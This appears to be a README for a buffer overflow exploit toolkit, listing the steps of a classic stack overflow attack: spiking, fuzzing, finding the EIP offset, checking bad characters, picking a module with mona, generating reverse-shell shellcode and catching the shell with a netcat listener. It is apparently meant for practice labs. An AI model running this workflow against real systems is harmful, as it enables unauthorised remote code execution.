
## Usage Guide:

### Spiking -> 
Edit spiking.spk with the command you want to spike
```
bash spiking.sh <ip> <port>
```

### Fuzzing ->
	Inside python fuzzing.py 
	Edit:
	```
	1. ip
	2. port
	3. command
	```
	>python fuzzing.py
	**Keep the program crash output _byte size_**

### Offset -> 
	```
	bash pattern.sh <byte size>
	```
	copy the pattern and paste in **offset.py** and change the **ip** **port** & **command**.
	> python offset.py
	> bash offset_value.sh <byte size> <pattern form Immunity Debugger>
	**Keep the program output _actual size**

### OverWrite EIP ->
	Inside overWriteEIP.py
	Edit:
	```
	1. Actual value
	2. ip
	3. port
	4. command
	```
	> python overWriteEIP.py

### Finding bad char -> 
	Inside badchar.py
	Edit:
	```
	1. Actual value
	2. ip
	3. port
	4. command
	```
	> python badchar.py
	**right click on ESP register vlaue and follow in dump and check for bad characters** 

### Finding right module -> 
	!mona module "<with dll with all false> "

### Generate shell code ->
	> bash rev_shell.sh <your ip> <your port>
	**Keep the output _payload_**

### Gain access -> 
	Inside final.py
	Edit:
	```
	1. Payload
	2. Actual value
	3. ip
	4. port
	5. command
	```
	Now Start netcat :
	> nc -lvnp <your ip> <your port>
	And Finally run:
	>python final.py

